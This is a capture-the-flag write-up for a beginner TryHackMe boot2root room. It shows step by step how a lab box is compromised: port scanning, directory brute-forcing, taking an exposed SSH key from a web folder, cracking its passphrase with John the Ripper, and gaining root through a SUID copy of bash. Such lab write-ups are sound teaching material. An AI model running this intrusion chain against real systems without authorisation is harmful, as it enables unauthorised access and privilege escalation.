# CAP26 CTF — Boot2Root Writeup

**Platform:** TryHackMe (Internal UTeM CTF)  
**Room:** Own the Box, Claim the Crown  
**Difficulty:** Beginner  
**Date:** 11/06/2026  
**Author:** Taufiq  

---

## Overview

A beginner Boot2Root machine with two objectives:

1. Find the user flag at `/home/john/user.txt`
2. Escalate privileges to root and find the root flag at `/root/root.txt`

**Attack path summary:**  
`nmap` → web enumeration → HTML source leak → encrypted SSH key → passphrase crack → SSH login → SUID bash privesc → root

---

## Environment

| Role | IP |
|---|---|
| Attacker (Attackbox) | `10.48.130.101` |
| Target (Lab machine) | `10.48.147.169` |

---

## Phase 1 — Reconnaissance

### Tool: nmap

```bash
nmap -sV -sC -oN nmap_initial.txt 10.48.147.169
```

**Flags explained:**
- `-sV` — detect service versions
- `-sC` — run default scripts (banner grab, basic enum)
- `-oN` — save output to file

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58
```

**Takeaway:** Only 2 ports open. SSH is rarely the entry point on CTF boxes — it's usually the exit after you find credentials. HTTP is the target.

---

## Phase 2 — Web Enumeration

### Step 1: Directory brute-force with gobuster

```bash
gobuster dir -u http://10.48.147.169 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o gobuster.txt
```

**Key results:**

```
/index.html    (Status: 200)
/robots.txt    (Status: 200)
/secret        (Status: 301) → /secret/
/uploads       (Status: 301) → /uploads/
```

**Why gobuster?** Web servers don't advertise their directories. Gobuster sends GET requests for thousands of common directory names and reports which ones return 200/301 (exist) vs 404 (don't exist).

### Step 2: Read the HTML source

```bash
curl -s http://10.48.147.169
```

At the bottom of `index.html`, hidden in a comment:

```html
<!--
Admin reminder:
john, the secret folder still contains the ssh key you uploaded.
we should remove it before anyone finds it.
-->
```

**What we learned:**
- Username: `john`
- SSH private key stored in `/secret/`

> **Lesson:** Always read the raw HTML source (`Ctrl+U` in browser or `curl`). Developers often leave debug comments, credentials, or internal notes that are invisible in the rendered view but present in the source.

### Step 3: Check /uploads/

```bash
curl http://10.48.147.169/uploads/
```

Found: `dict.lst` (46 bytes) — a short wordlist. This is a hint that we'll need to crack something.

```bash
curl http://10.48.147.169/uploads/dict.lst
```

Contents:
```
123456
password
admin
letmein
qwerty
starwars
```

---

## Phase 3 — Initial Access

### Step 1: Retrieve the SSH key

```bash
curl http://10.48.147.169/secret/
# Found: secretKey (not id_rsa — always check the directory listing)

curl http://10.48.147.169/secret/secretKey -o john_id_rsa
chmod 600 john_id_rsa
```

**Why `chmod 600`?** SSH refuses to use a private key that is readable by other users. 600 = owner read/write only.

### Step 2: Identify the key format

```bash
cat john_id_rsa
```

Header: `-----BEGIN OPENSSH PRIVATE KEY-----`  
Contains: `aes256-ctr` + `bcrypt` — this key is **encrypted with a passphrase**.

Direct SSH attempt fails:
```
Load key "john_id_rsa": error in libcrypto
```

### Step 3: Crack the passphrase

```bash
# Convert the encrypted key into a crackable hash format
ssh2john john_id_rsa > john_hash.txt

# Crack using the wordlist the box gave us
john john_hash.txt --wordlist=dict.lst
```

**Result:**
```
letmein    (john_id_rsa)
```

**How it works:**
- `ssh2john` extracts the encrypted portion of the private key and formats it as a hash
- `john` (John the Ripper) tries each word from the wordlist as the passphrase
- `bcrypt` is slow to hash, which is why we used a small targeted wordlist instead of `rockyou.txt`

### Step 4: SSH login

```bash
ssh -i john_id_rsa john@10.48.147.169
# Enter passphrase: letmein
```

---

## Phase 4 — User Flag

```bash
cat ~/user.txt
```

```
CAP26{Sh3ll_0r_B3_Sh3ll3d}
```

---

## Phase 5 — Privilege Escalation

### Step 1: Enumerate SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

**What is SUID?**  
The SUID (Set User ID) bit causes a file to execute as its *owner* rather than the user running it. If a binary owned by root has SUID set, it runs with root privileges regardless of who executes it.

**Result — suspicious binary:**
```
/usr/local/bin/backup-helper
```

This is not a standard Linux binary. Custom SUID binaries on CTF boxes are almost always the privesc vector.

### Step 2: Investigate the binary

```bash
file /usr/local/bin/backup-helper
# setuid ELF 64-bit LSB pie executable, x86-64, stripped

/usr/local/bin/backup-helper --help
# GNU bash, version 5.2.21
```

`backup-helper` is literally a **renamed copy of bash** with the SUID bit set.

### Step 3: Exploit SUID bash with -p flag

```bash
/usr/local/bin/backup-helper -p
```

**Why `-p`?**  
By default, bash drops SUID privileges on startup as a security measure (`euid` gets reset to `ruid`). The `-p` flag (`--privileged`) disables this behaviour, keeping the effective UID as root.

```bash
whoami   # root
id       # uid=1001(john) gid=1001(john) euid=0(root)
```

Note: `uid` is still john (who we are), but `euid` (effective UID) is 0 (root) — which is what matters for file access permissions.

---

## Phase 6 — Root Flag

```bash
cat /root/root.txt
```

```
CAP26{R00T3D_4ND_RUL3D}
```

---

## Attack Chain Summary

```
nmap (port scan)
  └─ Port 80 open (Apache)
      └─ gobuster (dir brute-force)
          ├─ /secret/ → secretKey (encrypted SSH private key)
          ├─ /uploads/ → dict.lst (cracking wordlist)
          └─ index.html source → HTML comment leaks username "john"
              └─ ssh2john + john (passphrase crack → "letmein")
                  └─ SSH login as john
                      └─ user flag ✓
                      └─ find SUID binaries
                          └─ /usr/local/bin/backup-helper (SUID bash)
                              └─ backup-helper -p (keep euid=root)
                                  └─ root flag ✓
```

---

## Key Lessons

| # | Lesson | Context |
|---|---|---|
| 1 | Always read raw HTML source | The admin comment was invisible in browser but visible in `curl` output |
| 2 | Check directory listings | `/secret/secretKey` not `/secret/id_rsa` — the name matters |
| 3 | Small wordlists beat big ones for bcrypt | `rockyou.txt` at 6p/s would take weeks; the box's own `dict.lst` cracked it instantly |
| 4 | SUID + bash = instant root | `find / -perm -4000` should always be in your privesc checklist |
| 5 | `bash -p` preserves SUID euid | Default bash drops privilege; `-p` flag keeps it |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port and service discovery |
| `gobuster` | Web directory brute-force |
| `curl` | HTTP requests and source inspection |
| `ssh2john` | Convert encrypted SSH key to crackable hash |
| `john` (John the Ripper) | Passphrase cracking |
| `find` | SUID binary enumeration |

---

## References

- [GTFOBins — bash SUID](https://gtfobins.github.io/gtfobins/bash/#suid)
- [ssh2john usage](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
- [TryHackMe](https://tryhackme.com)
